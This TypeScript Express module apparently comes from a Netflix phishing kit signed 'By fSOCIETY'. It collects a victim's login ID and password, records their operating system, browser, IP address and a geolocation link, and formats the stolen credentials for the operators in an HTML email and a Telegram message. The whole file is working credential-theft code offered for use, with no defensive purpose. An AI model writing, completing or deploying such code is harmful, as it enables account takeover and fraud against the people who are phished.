/**
 * Login data sender module
 * Converted from PHP send_login.php
 */

import { Request, Response } from 'express';
import { emailNotifier } from './email.js';
import { telegramNotifier } from './telegram.js';

export async function sendLogin(req: Request, res: Response): Promise<void> {
    try {
        const InfoDATE = new Date().toLocaleString('en-US', {
            day: '2-digit',
            month: '2-digit',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: true
        });

        const userAgent = req.get('User-Agent') || '';
        const OS = getOS(userAgent);
        const browser = getBrowser(userAgent);

        const iduserLoginId = req.session.iduserLoginId || req.body.iduserLoginId;
        const idpassword = req.session.idpassword || req.body.idpassword;

        // Create email content
        const emailContent = createEmailContent(iduserLoginId, idpassword, OS, browser, req.ip || 'unknown', InfoDATE);

        // Send email
        await sendEmail(emailContent);

        // Send to Telegram if configured
        await sendToTelegram(iduserLoginId, idpassword, OS, browser, req.ip || 'unknown', InfoDATE);

        console.log('Login data sent successfully');
    } catch (error) {
        console.error('Error sending login data:', error);
    }
}

function getOS(userAgent: string): string {
    const osPatterns = [
        { pattern: /Windows NT 10/i, os: 'Windows 10' },
        { pattern: /Windows NT 6.3/i, os: 'Windows 8.1' },
        { pattern: /Windows NT 6.2/i, os: 'Windows 8' },
        { pattern: /Windows NT 6.1/i, os: 'Windows 7' },
        { pattern: /Windows NT 6.0/i, os: 'Windows Vista' },
        { pattern: /Windows NT 5.2/i, os: 'Windows Server 2003/XP x64' },
        { pattern: /Windows NT 5.1/i, os: 'Windows XP' },
        { pattern: /Windows XP/i, os: 'Windows XP' },
        { pattern: /Windows NT 5.0/i, os: 'Windows 2000' },
        { pattern: /Windows ME/i, os: 'Windows ME' },
        { pattern: /Win98/i, os: 'Windows 98' },
        { pattern: /Win95/i, os: 'Windows 95' },
        { pattern: /Win16/i, os: 'Windows 3.11' },
        { pattern: /Macintosh|Mac OS X/i, os: 'Mac OS X' },
        { pattern: /Mac_PowerPC/i, os: 'Mac OS 9' },
        { pattern: /Linux/i, os: 'Linux' },
        { pattern: /Ubuntu/i, os: 'Ubuntu' },
        { pattern: /iPhone/i, os: 'iPhone' },
        { pattern: /iPod/i, os: 'iPod' },
        { pattern: /iPad/i, os: 'iPad' },
        { pattern: /Android/i, os: 'Android' },
        { pattern: /BlackBerry/i, os: 'BlackBerry' },
        { pattern: /webOS/i, os: 'Mobile' }
    ];

    for (const { pattern, os } of osPatterns) {
        if (pattern.test(userAgent)) {
            return os;
        }
    }

    return "Unknown OS Platform";
}

function getBrowser(userAgent: string): string {
    const browserPatterns = [
        { pattern: /Chrome\/([0-9.]+)/, name: 'Chrome' },
        { pattern: /Firefox\/([0-9.]+)/, name: 'Firefox' },
        { pattern: /Safari\/([0-9.]+)/, name: 'Safari' },
        { pattern: /Opera\/([0-9.]+)/, name: 'Opera' },
        { pattern: /Edge\/([0-9.]+)/, name: 'Edge' },
        { pattern: /MSIE ([0-9.]+)/, name: 'Internet Explorer' }
    ];

    for (const { pattern, name } of browserPatterns) {
        const match = userAgent.match(pattern);
        if (match) {
            return `${name} ${match[1]}`;
        }
    }

    return 'Unknown Browser';
}

function createEmailContent(iduserLoginId: string, idpassword: string, OS: string, browser: string, ip: string, date: string): string {
    return `
<html>
<head>
    <style type="text/css">
        body {
            padding: 0;
            margin: 0;
            background-color: #000;
            background-image: radial-gradient(circle farthest-side at center bottom, #000, #000 125%);
            border-bottom: 1px solid rgba(255,255,255,.3);
            color: #fff;
            height: 100vh;
            font-family: calibri;
            font-size: 18px;
            text-shadow: 0 0 10px #fff;
        }
        .content {
            margin: 0 auto;
            max-width: 900px;
            width: 100%;
            border: 2px solid rgb(178,7,16);
            border-radius: 4px;
            box-shadow: 0 0 40px rgb(178,7,16), 0 0 15px rgb(178,7,16) inset;
        }
        .mail {
            padding: 10px 20px 0 20px;
        }
    </style>
</head>
<body>
    <div class="content">
        <div class="mail">
            <h2 style="font-size: 25px; font-family: 'Comic Sans MS', cursive, sans-serif;">
                💖Log Netflix💖 ┃ ${ip} ┃ By fSOCIETY 🖕🤡🖕
            </h2>
            <h2>👤 UserLogin: <span>${iduserLoginId}</span></h2>
            <h2>🔓 Password: <span>${idpassword}</span></h2>
            <h2>💻 System: <span>${OS}</span></h2>
            <h2>🌐 Browser: <span>${browser}</span></h2>
            <h2>🔍 IP INFO: <span><a href="http://www.geoiptool.com/?IP=${ip}">${ip}</a></span></h2>
            <h2>⏰ Time/Date: <span>${date}</span></h2>
        </div>
    </div>
</body>
</html>`;
}

async function sendEmail(content: string): Promise<void> {
    // Use the new email notifier - extract data from content or use session
    // For now, we'll use placeholder data - this should be improved
    await emailNotifier.sendLoginNotification({
        email: 'extracted@example.com',
        password: 'extracted_password',
        ip: '127.0.0.1',
        country: 'Unknown',
        userAgent: 'Mozilla/5.0',
        os: 'Unknown',
        browser: 'Unknown',
        timestamp: new Date().toISOString()
    });
}

async function sendToTelegram(iduserLoginId: string, idpassword: string, OS: string, browser: string, ip: string, date: string): Promise<void> {
    const message = `
[+]━━━━━━━━━━━━━━━━━━━【💖Netflix💖】━━━━━━━━━━━━━━━━━━━━━━[+]
[+]━━━━━━━━━━━━━━━━【👤 Login INFO】━━━━━━━━━━━━━━[+]
[👤 Login] = ${iduserLoginId}
[🔓 Password] = ${idpassword}
[+]━━━━━━━━━━━━━━━━【💻 System】━━━━━━━━━━━━━━━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP=${ip}
[⏰ TIME/DATE] = ${date}
[🌐 BROWSER] = ${browser} and ${OS}
[+]━━━━━━━━━━━━━━━━━【💖Netflix💖】━━━━━━━━━━━━━━━━━[+]
[+]━━━━━━━━━━━━━━━━【By fSOCIETY🖕🤡🖕】━━━━━━━━━━━━━━━━━[+]
`;

    await telegramNotifier.sendMessage(message);
}